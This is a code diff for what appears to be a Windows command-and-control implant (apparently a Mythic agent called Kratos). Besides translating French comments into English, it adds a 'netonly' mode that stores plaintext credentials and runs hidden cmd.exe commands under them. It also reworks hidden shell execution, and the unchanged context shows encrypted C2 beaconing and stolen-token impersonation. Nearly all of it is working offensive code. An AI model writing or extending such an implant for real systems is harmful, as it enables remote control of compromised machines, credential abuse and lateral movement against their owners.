@@ -8,13 +8,17 @@
 #include <windows.h>
 #include <winhttp.h>
 
-/* Clé AES courante (32 bytes). Initialisée une fois depuis KRATOS_AESPSK. */
+/* Current AES key (32 bytes). Initialized once from KRATOS_AESPSK. */
 static unsigned char g_aes_key[32];
-static int g_has_aes_key = -1; /* -1=non init, 0=plaintext, 1=clé prête */
+static int g_has_aes_key = -1; /* -1=not init, 0=plaintext, 1=key ready */
 
-/* Token primaire volé via steal_token. NULL = pas d'impersonation active.
- * Utilisé par execute_shell pour spawner les commandes sous ce token. */
+/* Primary token stolen via steal_token. NULL = no active impersonation.
+ * Used by execute_shell to spawn commands under this token. */
 HANDLE g_stolen_token = NULL;
+int g_netonly_active = 0;
+char g_netonly_username[256] = {0};
+char g_netonly_domain[256] = {0};
+char g_netonly_password[512] = {0};
 
 extern char current_uuid[128];
 
@@ -258,7 +262,7 @@ char *send_c2_message(const char *json_msg) {
     return NULL;
   }
 
-  /* Pour HTTPS (auto-signé / lab), on ignore les erreurs de certificat */
+  /* For HTTPS (self-signed / lab), ignore certificate errors */
   if (is_https) {
     DWORD dwOpt = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
@@ -267,7 +271,7 @@ char *send_c2_message(const char *json_msg) {
                      sizeof(dwOpt));
   }
 
-  /* ── Ajout d'un Content-Type pour éviter les timeouts 12002 sur Tunnelmole ──
+  /* -- Add Content-Type to avoid 12002 timeouts on Tunnelmole --
    */
   const wchar_t *pszHeaders = L"Content-Type: text/plain\r\n";
   WinHttpAddRequestHeaders(hRequest, pszHeaders, -1L,
@@ -286,19 +290,19 @@ char *send_c2_message(const char *json_msg) {
   }
 #endif
 
-  /* ── Construction du message : UUID + payload (chiffré ou non) ── */
+  /* -- Build the message: UUID + payload (encrypted or not) -- */
   ensure_crypto_init();
 
   size_t json_len = strlen(json_msg);
   char *b64_msg = NULL;
 
   if (g_has_aes_key) {
-    /* Mode chiffré : AES-256-CBC + HMAC-SHA256 */
+    /* Encrypted mode: AES-256-CBC + HMAC-SHA256 */
     size_t cipher_len = 0;
     unsigned char *cipherblob = aes256_encrypt(
         g_aes_key, (const unsigned char *)json_msg, json_len, &cipher_len);
     if (cipherblob) {
-      /* Préfixer le UUID (36 chars) au cipherblob */
+      /* Prefix UUID (36 chars) to the cipherblob */
       size_t total_len = 36 + cipher_len;
       unsigned char *data_with_uuid = (unsigned char *)malloc(total_len);
       if (data_with_uuid) {
@@ -333,9 +337,9 @@ char *send_c2_message(const char *json_msg) {
   DEBUG_PRINT("Sent B64 Msg (len: %lu): %.100s...",
               (unsigned long)strlen(b64_msg), b64_msg);
 
-  /* Pour les corps > 64 KB, WinHTTP recommande WinHttpWriteData plutôt que
-   * lpOptional dans WinHttpSendRequest. Au-delà de cette limite, lpOptional
-   * peut être tronqué/corrompu → le serveur reçoit une requête invalide et
+  /* For bodies > 64 KB, WinHTTP recommends WinHttpWriteData rather than
+   * lpOptional in WinHttpSendRequest. Beyond this limit, lpOptional
+   * may be truncated/corrupted -> server receives an invalid request and
    * retourne 404. On utilise donc toujours WinHttpWriteData. */
   size_t body_len = strlen(b64_msg);
   BOOL bResults =
@@ -424,23 +428,23 @@ char *send_c2_message(const char *json_msg) {
   return response_buffer;
 }
 
-/* Exécute une commande shell sous un token primaire volé.
+/* Execute a shell command under a stolen primary token.
  *
  * POURQUOI PAS STARTF_USESTDHANDLES :
- * CreateProcessWithTokenW passe par le service SecLogon (processus séparé).
- * Ce service reçoit les VALEURS des handles mais ne peut pas les accéder dans
+ * CreateProcessWithTokenW goes through the SecLogon service (separate process).
+ * This service receives handle VALUES but cannot access them in
  * la table de handles du processus appelant → ERROR_INVALID_PARAMETER (87)
- * systématique, quelle que soit la configuration des handles.
+ * consistently, regardless of handle configuration.
  *
  * SOLUTION : rediriger la sortie vers un fichier temp via le shell (>),
- * sans STARTF_USESTDHANDLES ni héritage de handles.
+ * without STARTF_USESTDHANDLES or handle inheritance.
  *
- * STRATÉGIE :
+ * STRATEGY:
  *   1) CreateProcessAsUserW  (ne passe PAS par SecLogon, STARTF possible mais
- *      nécessite SeAssignPrimaryTokenPrivilege → rare chez les admins
+ *      requires SeAssignPrimaryTokenPrivilege -> rare even for admins
  * interactifs) 2) CreateProcessWithTokenW (passe par SecLogon, NO STARTF,
  * sortie via fichier) */
-/* Exécute une commande shell sous un token primaire volé. */
+/* Execute a shell command under a stolen primary token. */
 static char *execute_shell_with_token(HANDLE hToken, const char *cmd) {
   /* Chemin du fichier temporaire dans %SystemRoot%\Temp\ */
   char sys_root[MAX_PATH] = "C:\\Windows";
@@ -520,32 +524,146 @@ static char *execute_shell_with_token(HANDLE hToken, const char *cmd) {
   return output;
 }
 
+static char *execute_shell_netonly(const char *cmd) {
+  char sys_root[MAX_PATH] = "C:\\Windows";
+  GetEnvironmentVariableA("SystemRoot", sys_root, sizeof(sys_root));
+  char tmp_file[MAX_PATH];
+  snprintf(tmp_file, sizeof(tmp_file), "%s\\Temp\\krt%lu.tmp", sys_root,
+           GetCurrentProcessId() ^ GetCurrentThreadId());
+
+  char cmd_path[MAX_PATH];
+  GetSystemDirectoryA(cmd_path, sizeof(cmd_path));
+  strncat(cmd_path, "\\cmd.exe", sizeof(cmd_path) - strlen(cmd_path) - 1);
+
+  char full[2048];
+  snprintf(full, sizeof(full), "%s /c %s > \"%s\" 2>&1", cmd_path, cmd,
+           tmp_file);
+
+  wchar_t wuser[256];
+  wchar_t wdomain[256];
+  wchar_t wpass[512];
+  wchar_t wcmd[2048];
+  MultiByteToWideChar(CP_ACP, 0, g_netonly_username, -1, wuser, 256);
+  MultiByteToWideChar(CP_ACP, 0, g_netonly_domain, -1, wdomain, 256);
+  MultiByteToWideChar(CP_ACP, 0, g_netonly_password, -1, wpass, 512);
+  MultiByteToWideChar(CP_ACP, 0, full, -1, wcmd, 2048);
+
+  STARTUPINFOW si;
+  ZeroMemory(&si, sizeof(si));
+  si.cb = sizeof(si);
+  si.dwFlags = STARTF_USESHOWWINDOW;
+  si.wShowWindow = SW_HIDE;
+
+  PROCESS_INFORMATION pi;
+  ZeroMemory(&pi, sizeof(pi));
+
+  BOOL ok = CreateProcessWithLogonW(
+      wuser, wdomain, wpass, LOGON_NETCREDENTIALS_ONLY, NULL, wcmd,
+      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+  DWORD lastErr = GetLastError();
+
+  if (!ok) {
+    DeleteFileA(tmp_file);
+    char *err = (char *)malloc(160);
+    snprintf(err, 160,
+             "Error: CreateProcessWithLogonW(LOGON_NETCREDENTIALS_ONLY) "
+             "failed (%lu)",
+             lastErr);
+    return err;
+  }
+
+  WaitForSingleObject(pi.hProcess, 30000);
+  CloseHandle(pi.hProcess);
+  CloseHandle(pi.hThread);
+
+  HANDLE hFile =
+      CreateFileA(tmp_file, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+  char *output = (char *)malloc(1);
+  output[0] = '\0';
+  size_t total = 0;
+
+  if (hFile != INVALID_HANDLE_VALUE) {
+    char buf[4096];
+    DWORD bytes_read;
+    while (ReadFile(hFile, buf, sizeof(buf) - 1, &bytes_read, NULL) &&
+           bytes_read > 0) {
+      output = (char *)realloc(output, total + bytes_read + 1);
+      memcpy(output + total, buf, bytes_read);
+      total += bytes_read;
+      output[total] = '\0';
+    }
+    CloseHandle(hFile);
+  }
+  DeleteFileA(tmp_file);
+  return output;
+}
+
 char *execute_shell(const char *cmd) {
-  /* Si un token volé est actif, on tente de spawner via SecLogon */
+  if (g_netonly_active) {
+    return execute_shell_netonly(cmd);
+  }
+
+  /* If a stolen token is active, attempt to spawn via SecLogon */
   if (g_stolen_token != NULL) {
     return execute_shell_with_token(g_stolen_token, cmd);
   }
 
-  char path[2048];
+  /* Chemin de cmd.exe */
+  char cmd_path[MAX_PATH];
+  GetSystemDirectoryA(cmd_path, sizeof(cmd_path));
+  strncat(cmd_path, "\\cmd.exe", sizeof(cmd_path) - strlen(cmd_path) - 1);
+
+  /* Fichier temporaire pour capturer stdout+stderr */
+  char sys_root[MAX_PATH] = "C:\\Windows";
+  GetEnvironmentVariableA("SystemRoot", sys_root, sizeof(sys_root));
+  char tmp_file[MAX_PATH];
+  snprintf(tmp_file, sizeof(tmp_file), "%s\\Temp\\krt%lu.tmp", sys_root,
+           GetCurrentProcessId() ^ GetCurrentThreadId());
+
+  char full[2048];
+  snprintf(full, sizeof(full), "%s /c %s > \"%s\" 2>&1", cmd_path, cmd, tmp_file);
+
+  STARTUPINFOA si;
+  ZeroMemory(&si, sizeof(si));
+  si.cb = sizeof(si);
+  si.dwFlags = STARTF_USESHOWWINDOW;
+  si.wShowWindow = SW_HIDE;
+
+  PROCESS_INFORMATION pi;
+  ZeroMemory(&pi, sizeof(pi));
+
+  if (!CreateProcessA(NULL, full, NULL, NULL, FALSE,
+                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+    DeleteFileA(tmp_file);
+    return strdup("Error: CreateProcess failed");
+  }
+
+  WaitForSingleObject(pi.hProcess, 30000);
+  CloseHandle(pi.hProcess);
+  CloseHandle(pi.hThread);
+
+  /* Lire le fichier de sortie */
+  HANDLE hFile = CreateFileA(tmp_file, GENERIC_READ,
+                              FILE_SHARE_READ | FILE_SHARE_WRITE,
+                              NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
   char *output = (char *)malloc(1);
-  output[0] = 0;
+  output[0] = '\0';
   size_t total_len = 0;
 
-  char cmd_full[2048];
-  snprintf(cmd_full, sizeof(cmd_full), "%s 2>&1", cmd);
-
-  FILE *pipe = _popen(cmd_full, "r");
-  if (!pipe)
-    return strdup("Failed to open pipe");
-
-  while (fgets(path, sizeof(path), pipe) != NULL) {
-    size_t len = strlen(path);
-    output = (char *)realloc(output, total_len + len + 1);
-    memcpy(output + total_len, path, len);
-    total_len += len;
-    output[total_len] = 0;
+  if (hFile != INVALID_HANDLE_VALUE) {
+    char buf[4096];
+    DWORD bytes_read;
+    while (ReadFile(hFile, buf, sizeof(buf) - 1, &bytes_read, NULL) &&
+           bytes_read > 0) {
+      output = (char *)realloc(output, total_len + bytes_read + 1);
+      memcpy(output + total_len, buf, bytes_read);
+      total_len += bytes_read;
+      output[total_len] = '\0';
+    }
+    CloseHandle(hFile);
   }
-  _pclose(pipe);
+  DeleteFileA(tmp_file);
   return output;
 }
 
@@ -708,12 +826,12 @@ char *process_mythic_response(const char *b64_resp, size_t b64_len) {
     size_t payload_len = decoded_len - 36;
 
     if (g_has_aes_key) {
-      /* Mode chiffré : vérifier HMAC puis déchiffrer */
+      /* Encrypted mode: verify HMAC then decrypt */
       size_t plain_len = 0;
       unsigned char *plain =
           aes256_decrypt(g_aes_key, payload, payload_len, &plain_len);
       if (plain) {
-        json_out = (char *)plain; /* déjà null-terminé par aes256_decrypt */
+        json_out = (char *)plain; /* already null-terminated by aes256_decrypt */
       } else {
         DEBUG_PRINT("aes256_decrypt failed (HMAC mismatch or bad padding)");
       }
@@ -726,7 +844,7 @@ char *process_mythic_response(const char *b64_resp, size_t b64_len) {
       }
     }
   } else if (decoded_len > 0 && full_decoded[0] == '{') {
-    /* Fallback : réponse brute JSON sans UUID (ne devrait pas arriver en prod)
+    /* Fallback: raw JSON response without UUID (should not happen in production)
      */
     json_out = (char *)malloc(decoded_len + 1);
     if (json_out) {
@@ -742,7 +860,7 @@ int get_integrity_level() {
   HANDLE hToken = NULL;
   DWORD integrityLevel = 2; // Default to Medium (Normal user)
 
-  // On vérifie d'abord le token volé si on en a un
+  // Check stolen token first if we have one
   if (g_stolen_token != NULL) {
     hToken = g_stolen_token;
     // On ne ferme pas hToken ici car c'est g_stolen_token
@@ -754,7 +872,7 @@ int get_integrity_level() {
   if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0,
                            &dwLengthNeeded) &&
       GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
-    // Utilisation de malloc car LocalAlloc peut être problématique si non
+    // Using malloc because LocalAlloc can be problematic if not
     // inclus correctement
     PTOKEN_MANDATORY_LABEL pTIL =
         (PTOKEN_MANDATORY_LABEL)malloc(dwLengthNeeded);
@@ -797,12 +915,15 @@ void get_current_display_user(char *display_buffer, size_t size) {
                         : (integrity == 3) ? "High"
                                            : "Medium";
 
-  if (g_stolen_token != NULL) {
+  if (g_netonly_active) {
+    snprintf(display_buffer, size, "%s [%s\\%s (netonly)]", current_user,
+             g_netonly_domain, g_netonly_username);
+  } else if (g_stolen_token != NULL) {
     char stolen_user[256] = {0};
     char domain[256] = {0};
     DWORD needed = 0;
 
-    // On récupère le SID du token volé
+    // Get the SID of the stolen token
     GetTokenInformation(g_stolen_token, TokenUser, NULL, 0, &needed);
     TOKEN_USER *tu = (TOKEN_USER *)malloc(needed);
     if (tu &&
@@ -830,4 +951,11 @@ void get_current_display_user(char *display_buffer, size_t size) {
   } else {
     strncpy(display_buffer, current_user, size);
   }
+}
+
+void clear_netonly_state(void) {
+  g_netonly_active = 0;
+  SecureZeroMemory(g_netonly_username, sizeof(g_netonly_username));
+  SecureZeroMemory(g_netonly_domain, sizeof(g_netonly_domain));
+  SecureZeroMemory(g_netonly_password, sizeof(g_netonly_password));
 }
